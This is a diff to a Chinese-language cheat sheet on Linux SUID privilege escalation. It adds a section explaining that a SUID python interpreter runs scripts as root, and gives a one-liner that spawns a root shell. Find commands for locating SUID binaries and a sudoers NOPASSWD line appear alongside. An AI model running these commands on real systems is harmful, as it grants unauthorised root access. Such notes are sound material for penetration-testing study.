@@ -18,7 +18,14 @@ suid提权，即利用拥有root命令的二进制文件进行提权：
   
   your_username ALL=(ALL:ALL) NOPASSWD: ALL
   '''
-二：一般性的suid二进制文件
+
+二：python解释器拥有suid权限
+这很可怕，所有python脚本都将以root权限执行，比如反弹shell，或者
+
+  python -c 'import os;os.execl("/bin/sh", "sh", "-p")'
+直接用python新建一个终端(root)
+
+三：一般性的suid二进制文件
 find / -user root -perm -4000 -print 2>/dev/null    查找 root 用户拥有的 SUID 文件并打印路径
 find / -perm -u=s -type f 2>/dev/null    查找所有具备 SUID 权限的普通文件
 find / -user root -perm -4000 -exec ls {} \; 2>/dev/null    查找 root 用户拥有的 SUID 文件并显示详细信息
